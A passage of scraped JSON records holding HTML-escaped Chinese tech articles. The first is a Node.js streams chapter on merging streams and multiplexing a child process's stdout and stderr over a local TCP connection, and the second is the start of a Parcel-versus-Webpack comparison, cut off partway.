onEnd);\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e在前面的代码中，我们创建了从两个源目录（\u003ccode\u003esourceStreamA\u003c/code\u003e和\u003ccode\u003esourceStreamB\u003c/code\u003e）中读取的\u003ccode\u003eStream\u003c/code\u003e那么对于每个源\u003ccode\u003eStream\u003c/code\u003e，我们附加一个\u003ccode\u003eend\u003c/code\u003e事件订阅者，只有当这两个目录被完全读取时，才会触发\u003ccode\u003epack\u003c/code\u003e的\u003ccode\u003eend\u003c/code\u003e事件。\u003c/p\u003e\n\u003cp\u003e最后，合并两个\u003ccode\u003eStream\u003c/code\u003e：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003esourceStreamA.pipe(pack, {\u003cspan class=\"hljs-attr\"\u003eend\u003c/span\u003e: \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e});\nsourceStreamB.pipe(pack, {\u003cspan class=\"hljs-attr\"\u003eend\u003c/span\u003e: \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e});\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e我们将两个源文件都压缩到\u003ccode\u003epack\u003c/code\u003e这个\u003ccode\u003eStream\u003c/code\u003e中，并通过设定\u003ccode\u003epipe()\u003c/code\u003e的\u003ccode\u003eoption\u003c/code\u003e参数为\u003ccode\u003e{end：false}\u003c/code\u003e配置终点\u003ccode\u003eStream\u003c/code\u003e的自动触发\u003ccode\u003eend\u003c/code\u003e事件。\u003c/p\u003e\n\u003cp\u003e这样，我们已经完成了我们简单的\u003ccode\u003eTAR\u003c/code\u003e程序。我们可以通过提供目标文件作为第一个命令行参数，然后是两个源目录来尝试运行这个实用程序：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003enode mergeTar dest.tar /path/to/sourceA /path/to/sourceB\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e在\u003ccode\u003enpm\u003c/code\u003e中我们可以找到一些可以简化\u003ccode\u003eStream\u003c/code\u003e的合并的模块：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca target=\"_blank\" href=\"https://www.npmjs.com/package/merge-stream\"\u003emerge-stream\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca target=\"_blank\" href=\"https://www.npmjs.com/package/multistream-merge\"\u003emultistream-merge\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e要注意，流入目标\u003ccode\u003eStream\u003c/code\u003e的数据是随机混合的，这是一个在某些类型的对象流中可以接受的属性（正如我们在上一个例子中看到的那样），但是在处理二进制\u003ccode\u003eStream\u003c/code\u003e时通常是一个不希望这样。\u003c/p\u003e\n\u003cp\u003e然而，我们可以通过一种模式按顺序合并\u003ccode\u003eStream\u003c/code\u003e; 它包含一个接一个地合并源\u003ccode\u003eStream\u003c/code\u003e，当前一个结束时，开始发送第二段数据块（就像连接所有源\u003ccode\u003eStream\u003c/code\u003e的输出一样）。在\u003ccode\u003enpm\u003c/code\u003e上，我们可以找到一些也处理这种情况的软件包。其中之一是\u003ca target=\"_blank\" href=\"https://npmjs.org/package/multistream\"\u003emultistream\u003c/a\u003e。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e多路复用和多路分解\u003c/h3\u003e\n\u003cp\u003e合并\u003ccode\u003eStream\u003c/code\u003e模式有一个特殊的模式，我们并不是真的只想将多个\u003ccode\u003eStream\u003c/code\u003e合并在一起，而是使用一个共享通道来传送一组数据\u003ccode\u003eStream\u003c/code\u003e。与之前的不一样，因为源数据\u003ccode\u003eStream\u003c/code\u003e在共享通道内保持逻辑分离，这使得一旦数据到达共享通道的另一端，我们就可以再次分离数据\u003ccode\u003eStream\u003c/code\u003e。如图所示：\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/1/160b1e8f05fcf733?w=757\u0026amp;h=206\u0026amp;f=png\u0026amp;s=89158\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e将多个\u003ccode\u003eStream\u003c/code\u003e组合在单个\u003ccode\u003eStream\u003c/code\u003e上传输的操作被称为多路复用，而相反的操作（即，从共享\u003ccode\u003eStream\u003c/code\u003e接收数据重构原始的\u003ccode\u003eStream\u003c/code\u003e）则被称为多路分用。执行这些操作的设备分别称为多路复用器和多路分解器（。 这是一个在计算机科学和电信领域广泛研究的话题，因为它是几乎任何类型的通信媒体，如电话，广播，电视，当然还有互联网本身的基础之一。 对于本书的范围，我们不会过多解释，因为这是一个很大的话题。\u003c/p\u003e\n\u003cp\u003e我们想在本节中演示的是，如何使用共享的\u003ccode\u003eNode.js Streams\u003c/code\u003e来传送多个逻辑上分离的\u003ccode\u003eStream\u003c/code\u003e，然后在共享\u003ccode\u003eStream\u003c/code\u003e的另一端再次分离，即实现一次多路复用和多路分解。\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003e创建一个远程logger日志记录\u003c/h4\u003e\n\u003cp\u003e举例说明，我们希望有一个小程序来启动子进程，并将其标准输出和标准错误都重定向到远程服务器，服务器接受它们然后保存为两个单独的文件。因此，在这种情况下，共享介质是\u003ccode\u003eTCP\u003c/code\u003e连接，而要复用的两个通道是子进程的\u003ccode\u003estdout\u003c/code\u003e和\u003ccode\u003estderr\u003c/code\u003e。 我们将利用分组交换的技术，这种技术与\u003ccode\u003eIP\u003c/code\u003e，\u003ccode\u003eTCP\u003c/code\u003e或\u003ccode\u003eUDP\u003c/code\u003e等协议所使用的技术相同，包括将数据封装在数据包中，允许我们指定各种源信息，这对多路复用，路由，控制 流程，检查损坏的数据都十分有帮助。\u003c/p\u003e\n\u003cp\u003e如图所示，这个例子的协议大概是这样，数据被封装成具有以下结构的数据包：\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/1/160b1e8f064f1a2d?w=471\u0026amp;h=153\u0026amp;f=png\u0026amp;s=14706\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003ch5 class=\"heading\"\u003e在客户端实现多路复用\u003c/h5\u003e\n\u003cp\u003e先说客户端，创建一个名为\u003ccode\u003eclient.js\u003c/code\u003e的模块，这是我们这个应用程序的一部分，它负责启动一个子进程并实现\u003ccode\u003eStream\u003c/code\u003e多路复用。\u003c/p\u003e\n\u003cp\u003e开始定义模块，首先加载依赖：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e child_process = \u003cspan class=\"hljs-built_in\"\u003erequire\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'child_process'\u003c/span\u003e);\n\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e net = \u003cspan class=\"hljs-built_in\"\u003erequire\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'net'\u003c/span\u003e);\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e然后开始实现多路复用的函数：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003emultiplexChannels\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003esources, destination\u003c/span\u003e) \u003c/span\u003e{\n  \u003cspan class=\"hljs-keyword\"\u003elet\u003c/span\u003e totalChannels = sources.length;\n\n  \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e(\u003cspan class=\"hljs-keyword\"\u003elet\u003c/span\u003e i = \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e; i \u0026lt; sources.length; i++) {\n    sources[i]\n      .on(\u003cspan class=\"hljs-string\"\u003e'readable'\u003c/span\u003e, \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{ \u003cspan class=\"hljs-comment\"\u003e// [1]\u003c/span\u003e\n        \u003cspan class=\"hljs-keyword\"\u003elet\u003c/span\u003e chunk;\n        \u003cspan class=\"hljs-keyword\"\u003ewhile\u003c/span\u003e ((chunk = \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.read()) !== \u003cspan class=\"hljs-literal\"\u003enull\u003c/span\u003e) {\n          \u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e outBuff = \u003cspan class=\"hljs-keyword\"\u003enew\u003c/span\u003e Buffer(\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e + \u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e + chunk.length); \u003cspan class=\"hljs-comment\"\u003e// [2]\u003c/span\u003e\n          outBuff.writeUInt8(i, \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e);\n          outBuff.writeUInt32BE(chunk.length, \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e);\n          chunk.copy(outBuff, \u003cspan class=\"hljs-number\"\u003e5\u003c/span\u003e);\n          \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\u003cspan class=\"hljs-string\"\u003e'Sending packet to channel: '\u003c/span\u003e + i);\n          destination.write(outBuff); \u003cspan class=\"hljs-comment\"\u003e// [3]\u003c/span\u003e\n        }\n      })\n      .on(\u003cspan class=\"hljs-string\"\u003e'end'\u003c/span\u003e, () =\u0026gt; { \u003cspan class=\"hljs-comment\"\u003e//[4]\u003c/span\u003e\n        \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (--totalChannels === \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e) {\n          destination.end();\n        }\n      });\n  }\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003ccode\u003emultiplexChannels()\u003c/code\u003e函数接受要复用的源\u003ccode\u003eStream\u003c/code\u003e作为输入\n和复用接口作为参数，然后执行以下步骤：\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e对于每个源\u003ccode\u003eStream\u003c/code\u003e，它会注册一个\u003ccode\u003ereadable\u003c/code\u003e事件侦听器，我们使用\u003ccode\u003enon-flowing\u003c/code\u003e模式从流中读取数据。\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e每读取一个数据块，我们将其封装到一个首部中，首部的顺序为：\u003ccode\u003echannel ID\u003c/code\u003e为1字节（\u003ccode\u003eUInt8\u003c/code\u003e），数据包大小为4字节（\u003ccode\u003eUInt32BE\u003c/code\u003e），然后为实际数据。\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e数据包准备好后，我们将其写入目标\u003ccode\u003eStream\u003c/code\u003e。\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e我们为\u003ccode\u003eend\u003c/code\u003e事件注册一个监听器，以便当所有源\u003ccode\u003eStream\u003c/code\u003e结束时，\u003ccode\u003eend\u003c/code\u003e事件触发，通知目标\u003ccode\u003eStream\u003c/code\u003e触发\u003ccode\u003eend\u003c/code\u003e事件。\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003cblockquote\u003e\n\u003cp\u003e注意，我们的协议最多能够复用多达256个不同的源流，因为我们只有1个字节来标识\u003ccode\u003echannel\u003c/code\u003e。\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e socket = net.connect(\u003cspan class=\"hljs-number\"\u003e3000\u003c/span\u003e, () =\u0026gt; { \u003cspan class=\"hljs-comment\"\u003e// [1]\u003c/span\u003e\n  \u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e child = child_process.fork( \u003cspan class=\"hljs-comment\"\u003e// [2]\u003c/span\u003e\n    process.argv[\u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e],\n    process.argv.slice(\u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e), {\n      \u003cspan class=\"hljs-attr\"\u003esilent\u003c/span\u003e: \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e\n    }\n  );\n  multiplexChannels([child.stdout, child.stderr], socket); \u003cspan class=\"hljs-comment\"\u003e// [3]\u003c/span\u003e\n});\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e在最后，我们执行以下操作：\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e我们创建一个新的\u003ccode\u003eTCP\u003c/code\u003e客户端连接到地址\u003ccode\u003elocalhost:3000\u003c/code\u003e。\u003c/li\u003e\n\u003cli\u003e我们通过使用第一个命令行参数作为路径来启动子进程，同时我们提供剩余的\u003ccode\u003eprocess.argv\u003c/code\u003e数组作为子进程的参数。我们指定选项\u003ccode\u003e{silent：true}\u003c/code\u003e，以便子进程不会继承父级的\u003ccode\u003estdout\u003c/code\u003e和\u003ccode\u003estderr\u003c/code\u003e。\u003c/li\u003e\n\u003cli\u003e我们使用\u003ccode\u003emutiplexChannels()\u003c/code\u003e函数将\u003ccode\u003estdout\u003c/code\u003e和\u003ccode\u003estderr\u003c/code\u003e多路复用到\u003ccode\u003esocket\u003c/code\u003e里。\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch5 class=\"heading\"\u003e在服务端实现多路分解\u003c/h5\u003e\n\u003cp\u003e现在来看服务端，创建\u003ccode\u003eserver.js\u003c/code\u003e模块，在这里我们将来自远程连接的\u003ccode\u003eStream\u003c/code\u003e多路分解，并将它们传送到两个不同的文件中。\u003c/p\u003e\n\u003cp\u003e首先创建一个名为\u003ccode\u003edemultiplexChannel()\u003c/code\u003e的函数：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003edemultiplexChannel\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003esource, destinations\u003c/span\u003e) \u003c/span\u003e{\n  \u003cspan class=\"hljs-keyword\"\u003elet\u003c/span\u003e currentChannel = \u003cspan class=\"hljs-literal\"\u003enull\u003c/span\u003e;\n  \u003cspan class=\"hljs-keyword\"\u003elet\u003c/span\u003e currentLength = \u003cspan class=\"hljs-literal\"\u003enull\u003c/span\u003e;\n  source\n    .on(\u003cspan class=\"hljs-string\"\u003e'readable'\u003c/span\u003e, () =\u0026gt; { \u003cspan class=\"hljs-comment\"\u003e//[1]\u003c/span\u003e\n      \u003cspan class=\"hljs-keyword\"\u003elet\u003c/span\u003e chunk;\n      \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e(currentChannel === \u003cspan class=\"hljs-literal\"\u003enull\u003c/span\u003e) {          \u003cspan class=\"hljs-comment\"\u003e//[2]\u003c/span\u003e\n        chunk = source.read(\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e);\n        currentChannel = chunk \u0026amp;\u0026amp; chunk.readUInt8(\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e);\n      }\n    \n      \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e(currentLength === \u003cspan class=\"hljs-literal\"\u003enull\u003c/span\u003e) {          \u003cspan class=\"hljs-comment\"\u003e//[3]\u003c/span\u003e\n        chunk = source.read(\u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e);\n        currentLength = chunk \u0026amp;\u0026amp; chunk.readUInt32BE(\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e);\n        \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e(currentLength === \u003cspan class=\"hljs-literal\"\u003enull\u003c/span\u003e) {\n          \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e;\n        }\n      }\n    \n      chunk = source.read(currentLength);        \u003cspan class=\"hljs-comment\"\u003e//[4]\u003c/span\u003e\n      \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e(chunk === \u003cspan class=\"hljs-literal\"\u003enull\u003c/span\u003e) {\n        \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e;\n      }\n    \n      \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\u003cspan class=\"hljs-string\"\u003e'Received packet from: '\u003c/span\u003e + currentChannel);\n    \n      destinations[currentChannel].write(chunk);      \u003cspan class=\"hljs-comment\"\u003e//[5]\u003c/span\u003e\n      currentChannel = \u003cspan class=\"hljs-literal\"\u003enull\u003c/span\u003e;\n      currentLength = \u003cspan class=\"hljs-literal\"\u003enull\u003c/span\u003e;\n    })\n    .on(\u003cspan class=\"hljs-string\"\u003e'end'\u003c/span\u003e, () =\u0026gt; {            \u003cspan class=\"hljs-comment\"\u003e//[6]\u003c/span\u003e\n      destinations.forEach(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-params\"\u003edestination\u003c/span\u003e =\u0026gt;\u003c/span\u003e destination.end());\n      \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\u003cspan class=\"hljs-string\"\u003e'Source channel closed'\u003c/span\u003e);\n    })\n  ;\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e上面的代码可能看起来很复杂，仔细阅读并非如此；由于\u003ccode\u003eNode.js\u003c/code\u003e可读的\u003ccode\u003eStream\u003c/code\u003e的拉动特性，我们可以很容易地实现我们的小协议的多路分解，如下所示：\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e我们开始使用\u003ccode\u003enon-flowing\u003c/code\u003e模式从流中读取数据。\u003c/li\u003e\n\u003cli\u003e首先，如果我们还没有读取\u003ccode\u003echannel ID\u003c/code\u003e，我们尝试从流中读取1个字节，然后将其转换为数字。\u003c/li\u003e\n\u003cli\u003e下一步是读取首部的长度。我们需要读取4个字节，所以有可能在内部\u003ccode\u003eBuffer\u003c/code\u003e还没有足够的数据，这将导致\u003ccode\u003ethis.read()\u003c/code\u003e调用返回\u003ccode\u003enull\u003c/code\u003e。在这种情况下，我们只是中断解析，然后重试下一个\u003ccode\u003ereadable\u003c/code\u003e事件。\u003c/li\u003e\n\u003cli\u003e当我们最终还可以读取数据大小时，我们知道从内部\u003ccode\u003eBuffer\u003c/code\u003e中拉出多少数据，所以我们尝试读取所有数据。\u003c/li\u003e\n\u003cli\u003e当我们读取所有的数据时，我们可以把它写到正确的目标通道，一定要记得重置\u003ccode\u003ecurrentChannel\u003c/code\u003e和\u003ccode\u003ecurrentLength\u003c/code\u003e变量（这些变量将被用来解析下一个数据包）。\u003c/li\u003e\n\u003cli\u003e最后，当源\u003ccode\u003echannel\u003c/code\u003e结束时，一定不要忘记调用目标\u003ccode\u003eStream\u003c/code\u003e的\u003ccode\u003eend()\u003c/code\u003e方法。\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e既然我们可以多路分解源\u003ccode\u003eStream\u003c/code\u003e，进行如下调用：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003enet.createServer(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-params\"\u003esocket\u003c/span\u003e =\u0026gt;\u003c/span\u003e {\n  \u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e stdoutStream = fs.createWriteStream(\u003cspan class=\"hljs-string\"\u003e'stdout.log'\u003c/span\u003e);\n  \u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e stderrStream = fs.createWriteStream(\u003cspan class=\"hljs-string\"\u003e'stderr.log'\u003c/span\u003e);\n  demultiplexChannel(socket, [stdoutStream, stderrStream]);\n})\n  .listen(\u003cspan class=\"hljs-number\"\u003e3000\u003c/span\u003e, () =\u0026gt; \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\u003cspan class=\"hljs-string\"\u003e'Server started'\u003c/span\u003e))\n;\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e在上面的代码中，我们首先在\u003ccode\u003e3000\u003c/code\u003e端口上启动一个\u003ccode\u003eTCP\u003c/code\u003e服务器，然后对于我们接收到的每个连接，我们将创建两个可写入的\u003ccode\u003eStream\u003c/code\u003e，指向两个不同的文件，一个用于标准输出，另一个用于标准错误; 这些是我们的目标\u003ccode\u003echannel\u003c/code\u003e。 最后，我们使用\u003ccode\u003edemultiplexChannel()\u003c/code\u003e将套接字流解复用为\u003ccode\u003estdoutStream\u003c/code\u003e和\u003ccode\u003estderrStream\u003c/code\u003e。\u003c/p\u003e\n\u003ch5 class=\"heading\"\u003e运行多路复用和多路分解应用程序\u003c/h5\u003e\n\u003cp\u003e现在，我们准备尝试运行我们的新的多路复用/多路分解应用程序，但首先让我们创建一个小的\u003ccode\u003eNode.js\u003c/code\u003e程序来产生一些示例输出; 我们把它叫做\u003ccode\u003egenerateData.js\u003c/code\u003e：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\u003cspan class=\"hljs-string\"\u003e\"out1\"\u003c/span\u003e);\n\u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\u003cspan class=\"hljs-string\"\u003e\"out2\"\u003c/span\u003e);\n\u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.error(\u003cspan class=\"hljs-string\"\u003e\"err1\"\u003c/span\u003e);\n\u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\u003cspan class=\"hljs-string\"\u003e\"out3\"\u003c/span\u003e);\n\u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.error(\u003cspan class=\"hljs-string\"\u003e\"err2\"\u003c/span\u003e);\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e首先，让我们开始运行服务端：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003enode server\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e然后运行客户端，需要提供作为子进程的文件参数：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003enode client generateData.js\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/1/160b1e8f27939bc7?w=955\u0026amp;h=1076\u0026amp;f=png\u0026amp;s=141176\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e客户端几乎立马运行，但是进程结束时，\u003ccode\u003egenerateData\u003c/code\u003e应用程序的标准输入和标准输出经过一个\u003ccode\u003eTCP\u003c/code\u003e连接，然后在服务器端，被多路分解成两个文件。\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e注意，当我们使用\u003ccode\u003echild_process.fork()\u003c/code\u003e时，我们的客户端能够启动别的\u003ccode\u003eNode.js\u003c/code\u003e模块。\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch4 class=\"heading\"\u003e对象Streams的多路复用和多路分解\u003c/h4\u003e\n\u003cp\u003e我们刚刚展示的例子演示了如何复用和解复用二进制/文本\u003ccode\u003eStream\u003c/code\u003e，但值得一提的是，相同的规则也适用于对象\u003ccode\u003eStream\u003c/code\u003e。 最大的区别是，使用对象，我们已经有了使用原子消息（对象）传输数据的方法，所以多路复用就像设置一个属性\u003ccode\u003echannel ID\u003c/code\u003e到每个对象一样简单，而多路分解只需要读\u003ccode\u003e·channel ID\u003c/code\u003e属性，并将每个对象路由到正确的目标\u003ccode\u003eStream\u003c/code\u003e。\u003c/p\u003e\n\u003cp\u003e还有一种模式是取一个对象上的几个属性并分发到多个目的\u003ccode\u003eStream\u003c/code\u003e的模式 通过这种模式，我们可以实现复杂的流程，如下图所示：\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/1/160b1e8f2510f072?w=754\u0026amp;h=238\u0026amp;f=png\u0026amp;s=109160\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e如上图所示，取一个对象\u003ccode\u003eStream\u003c/code\u003e表示\u003ccode\u003eanimals\u003c/code\u003e，然后根据动物类型：\u003ccode\u003ereptiles\u003c/code\u003e，\u003ccode\u003eamphibians\u003c/code\u003e和\u003ccode\u003emammals\u003c/code\u003e，然后分发到正确的目标\u003ccode\u003eStream\u003c/code\u003e中。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e总结\u003c/h2\u003e\n\u003cp\u003e在本章中，我们已经对\u003ccode\u003eNode.js Streams\u003c/code\u003e及其使用案例进行了阐述，但同时也应该为编程范式打开一扇大门，几乎具有无限的可能性。我们了解了为什么\u003ccode\u003eStream\u003c/code\u003e被\u003ccode\u003eNode.js\u003c/code\u003e社区赞誉，并且我们掌握了它们的基本功能，使我们能够利用它做更多有趣的事情。我们分析了一些先进的模式，并开始了解如何将不同配置的\u003ccode\u003eStreams\u003c/code\u003e连接在一起，掌握这些特性，从而使流如此多才多艺，功能强大。\u003c/p\u003e\n\u003cp\u003e如果我们遇到不能用一个\u003ccode\u003eStream\u003c/code\u003e来实现的功能，我们可以通过将其他\u003ccode\u003eStreams\u003c/code\u003e连接在一起来实现，这是\u003ccode\u003eNode.js\u003c/code\u003e的一个很好的特性；\u003ccode\u003eStreams\u003c/code\u003e在处理二进制数据，字符串和对象都十分有用，并具有鲜明的特点。\u003c/p\u003e\n\u003cp\u003e在下一章中，我们将重点介绍传统的面向对象的设计模式。尽管\u003ccode\u003eJavaScript\u003c/code\u003e在某种程度上是面向对象的语言，但在\u003ccode\u003eNode.js\u003c/code\u003e中，函数式或混合方法通常是首选。在阅读下一章便揭晓答案。\u003c/p\u003e\n","buildTime":"1514894734.5661","__v":0}
{"_id":{"$oid":"5a4b76d92239bd131cd79f3d"},"id":"5a439fd7518825455f2f91a7","author":{"$oid":"5a4b76d92239bd131cd79f36"},"imageCache":[{"imageUrlArray":["https://user-gold-cdn.xitu.io/2017/12/27/1609828804675828?w=2206\u0026h=546\u0026f=png\u0026s=307152"],"screenShot":null}],"title":"Parcel Vs Webpack","meta":{"likeCount":0},"tag":["Webpack"],"comment":[],"shortContent":"横空出世的Parcel近日成为了前端圈的又一大热点，在短短几周内就获得了13K的Star。 我花了6个月的时间写了一本全面介绍Webpack的图书《深入浅出 Webpack》近日刚出版，感觉被新出的Parcel给腰斩了。 但本文将本着公平公正的心态来详细对比一下他两，让你能明白…","content":"\u003cblockquote\u003e\n\u003cp\u003eAD：\u003cstrong\u003e美团成都研发中心正在招聘大量\u003c/strong\u003e Web 前端、iOS、Android、Java 后端、QA，技术牛、待遇好、发展前景大、生活舒适，有意者请邮件 gwuhaolin@icloud.com\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cblockquote\u003e\n\u003cp\u003e爱折腾的前端圈时常会有新轮子诞生，只要是好东西就能快速获得大量关注，资历再好的大哥只要不如新人也很快会被替代。\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e横空出世的\u003ca target=\"_blank\" href=\"https://parceljs.org/\"\u003eParcel\u003c/a\u003e近日成为了前端圈的又一大热点，在短短几周内就获得了13K的Star。\n作为前端构建工具新人的Parcel为什么能在短期内获得这么多赞同？他和老大哥Webpack比起来到底有什么优势呢？\u003c/p\u003e\n\u003cp\u003e我花了6个月的时间写了一本全面介绍Webpack的图书\u003ca target=\"_blank\" href=\"http://webpack.wuhaolin.cn/\"\u003e《深入浅出 Webpack》\u003c/a\u003e近日刚出版，感觉被新出的Parcel给腰斩了。\n但本文将本着公平公正的心态来详细对比一下他两，让你能明白他们直接的异同和优缺点对比，好决定是选Parcel还是Webpack。\u003c/p\u003e\n\u003cp\u003e为了对比他两，我们从实际出发举一个实战项目为例子，分别用Parcel和Webpack去实现，实战项目要求如下：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e项目采用TypeScript+React+SCSS；\u003c/li\u003e\n\u003cli\u003e项目采用了\u003ca target=\"_blank\" href=\"https://ant.design\"\u003eAntd\u003c/a\u003e UI组件库，但要做到按需加载只用到了的组件，而不是所有组件都打包进去；\u003c/li\u003e\n\u003cli\u003e项目使用了\u003ca target=\"_blank\" href=\"https://lodash.com\"\u003eLodash\u003c/a\u003e库，用于检查构建是否有剔除无用代码的能力(TreeShaking)；\u003c/li\u003e\n\u003cli\u003e构建需要支持模块热替换功能，以提高开发效率；\u003c/li\u003e\n\u003cli\u003e支持SourceMap，以方便调试；\u003c/li\u003e\n\u003cli\u003e对比他们的首次启动速度和监听变化时的构建速度；\u003c/li\u003e\n\u003cli\u003e在生成环境下需要压缩JS、CSS，CSS需要提取到单独到文件，并对比他们在生产环境下构建出文件大小；\u003c/li\u003e\n\u003cli\u003e需要生成自动会加载对应资源的HTML文件；\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 